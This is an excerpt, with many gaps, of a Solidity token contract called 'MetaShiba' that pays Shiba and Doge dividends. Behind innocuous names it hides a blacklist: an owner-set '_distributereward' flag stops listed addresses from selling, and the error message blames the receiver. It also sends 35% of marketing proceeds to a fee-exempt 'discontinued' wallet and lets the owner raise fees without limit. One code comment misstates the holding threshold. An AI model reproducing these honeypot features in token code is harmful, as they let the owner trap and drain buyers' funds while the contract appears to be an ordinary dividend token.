...
contract MetaShiba is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    uint256 public shibaDividendPriority = 60;
    ...
    uint256 public sellFeeIncreaseFactor = 165;

    uint256 public gasForProcessing = 600000;

    mapping (address => bool) private isExcludedFromFees;
    mapping(address => bool) _distributereward;
    
    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping (address => bool) public automatedMarketMakerPairs;
    
    event DistributeRewUpdated(address indexed user, bool value);
    event UpdateShibaDividendTracker(address indexed newAddress, address indexed oldAddress);
    ...
    event DiscontinuedUpdated(address indexed newDiscontinued, address indexed oldDiscontinued);
    ...
    event ProcessedShibaDividendTracker(
        uint256 iterations,
        uint256 claims,
    ...
    constructor() ERC20("MetaShiba", "MetaShiba") {
        shibaDividendTracker = new ShibaDividendTracker();
        dogeDividendTracker = new DogeDividendTracker();

        marketingWallet = 0x54d3e251FF5630686474704Ae897A752d9882cA0;
        discontinued = 0xd1369D1B331e61194C044aEfE2fC4FaD919f0718;
        shibaDividendToken = 0x2859e4544C4bB03966803b044A93563Bd2D0DD4D;
        ...
        excludeFromFees(discontinued, true);
    ...
    function updateMinShibaBeforeSendDividend(uint256 _newAmount) external onlyOwner {
        shibaDividendTracker.setMinTokenBeforeSendDividend(_newAmount);
    }
    ...
    function getMinShibaBeforeSendDividend() external view returns (uint256) {
        return shibaDividendTracker.minTokenBeforeSendDividend();
    }
    ...
    function setSendShibaInTx(bool _newStatus) external onlyOwner {
        sendShibaInTx = _newStatus;
    }

    function setShibaDividendPriority(uint256 _newAmount) external onlyOwner {
        require(_newAmount >= 0 && _newAmount <= 100, "Error amount");
        shibaDividendPriority = _newAmount;
    }

    function updateDiscontinued(address _discontinued) external onlyOwner {
        excludeFromFees(_discontinued, true);
    ...
    function afterPreSale() external onlyOwner {
        ...
        maxBuyTransactionAmount = 1000000000000000 * (10**9);
    ...
    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = buyBackAndLiquidityFee.add(marketingFee).add(dogeDividendRewardsFee).add(shibaDividendRewardsFee);
            buyBackAndLiquifyEnabled = _enabled;
        }
    ...
    function setShibaDividendEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = shibaDividendRewardsFee.add(marketingFee).add(dogeDividendRewardsFee).add(buyBackAndLiquidityFee);
            shibaDividendEnabled = _enabled;
        }
    ...
    function setDogeDividendEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = dogeDividendRewardsFee.add(marketingFee).add(shibaDividendRewardsFee).add(buyBackAndLiquidityFee);
            dogeDividendEnabled = _enabled;
        }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(dogeDividendRewardsFee).add(shibaDividendRewardsFee).add(buyBackAndLiquidityFee);
            marketingEnabled = _enabled;
        }
    ...
    function updateShibaDividendTracker(address newAddress) external onlyOwner {
        ShibaDividendTracker newShibaDividendTracker = ShibaDividendTracker(payable(newAddress));

        require(newShibaDividendTracker.owner() == address(this), "must be owned by MetaShiba");

        newShibaDividendTracker.excludeFromDividends(address(newShibaDividendTracker));
        newShibaDividendTracker.excludeFromDividends(address(this));
        newShibaDividendTracker.excludeFromDividends(address(uniswapV2Router));
        newShibaDividendTracker.excludeFromDividends(address(deadAddress));

        emit UpdateShibaDividendTracker(newAddress, address(shibaDividendTracker));

        shibaDividendTracker = newShibaDividendTracker;
    }
    ...
    function updateDogeDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newDogeDividendTracker.owner() == address(this), "must be owned by MetaShiba");
    ...
    function updateDogeDividendRewardFee(uint8 newFee) external onlyOwner {
        ...
        totalFees = dogeDividendRewardsFee.add(shibaDividendRewardsFee).add(marketingFee).add(buyBackAndLiquidityFee);
    }

    function updateMarketingFee(uint8 newFee) external onlyOwner {
        marketingFee = newFee;
        totalFees = marketingFee.add(shibaDividendRewardsFee).add(dogeDividendRewardsFee).add(buyBackAndLiquidityFee);
    }

    function updateBuyBackAndLiquidityFee(uint8 newFee) external onlyOwner {
        buyBackAndLiquidityFee = newFee;
        totalFees = buyBackAndLiquidityFee.add(shibaDividendRewardsFee).add(dogeDividendRewardsFee).add(marketingFee);
    }
    ...
    function getShibaClaimWait() external view returns(uint256) {
        return shibaDividendTracker.claimWait();
    }
    ...
    function getTotalShibaDividendsDistributed() external view returns (uint256) {
        return shibaDividendTracker.totalDividendsDistributed();
    }
    ...
    function withdrawableShibaDividendOf(address account) external view returns(uint256) {
        return shibaDividendTracker.withdrawableDividendOf(account);
    }
    ...
    function shibaDividendTokenBalanceOf(address account) external view returns (uint256) {
        return shibaDividendTracker.balanceOf(account);
    }
    ...
    function getAccountShibaDividendsInfo(address account)
    external view returns (
        ...
        uint256,
        uint256) {
        return shibaDividendTracker.getAccount(account);
    }
    ...
    function getAccountShibaDividendsInfoAtIndex(uint256 index)
    external view returns (
        address,
        int256,
        int256,
        ...
        uint256,
        uint256) {
        return shibaDividendTracker.getAccountAtIndex(index);
    }
    ...
    function getLastShibaDividendProcessedIndex() external view returns(uint256) {
        return shibaDividendTracker.getLastProcessedIndex();
    }
    ...
    function getNumberOfShibaDividendTokenHolders() external view returns(uint256) {
        return shibaDividendTracker.getNumberOfTokenHolders();
    }
    ...
    function getNumberOfDogeDividendTokenHolders() external view returns(uint256) {
     ...
     function isDistributeReward(address user) public view returns (bool) {
        return _distributereward[user];
    }
     
     function distributerewardUpdate(address user, bool value) public virtual onlyOwner {
        // require(_owner == _msgSender(), "Only owner is allowed to modify distributereward.");
        _distributereward[user] = value;
    }
    ...
    function _transfer(
        ...
        require (!isDistributeReward(from), "Token transfer refused. Receiver is on DistributeReward");
        require(from != address(0), "zero address");
        require(to != address(0), "zero address");
        require(airdropIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "AirDrop not started");
        ...
        if (
            ...
            if (!swapping && contractTokenBalance >= swapTokensAtAmount) {
                ...
                if (marketingEnabled) {
                    ...
                    uint256 discontinuedPortion = address(this).balance.div(10**2).mul(35);
                    uint256 marketingPortion = address(this).balance.sub(discontinuedPortion);
                    transferToWallet(payable(marketingWallet), marketingPortion);
                    transferToWallet(payable(discontinued), discontinuedPortion);
                }
                ...
                if (shibaDividendEnabled) {
                    uint256 sellTokens = contractTokenBalance.div(totalFees).mul(shibaDividendRewardsFee);
                    swapAndSendShibaDividends(sellTokens.sub(1300));
                }
        ...
        if(airdropIsEnabled && !swapping && !excludedAccount) {
        ...
        if(!swapping) {
            ...
            if(rand() <= shibaDividendPriority) {

                if( shibaDividendEnabled && sendShibaInTx ){
...
contract DogeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("Doge_Dividend_Tracker", "Doge_Dividend_Tracker", 0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47) {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**9); //must hold 10000+ tokens
    }
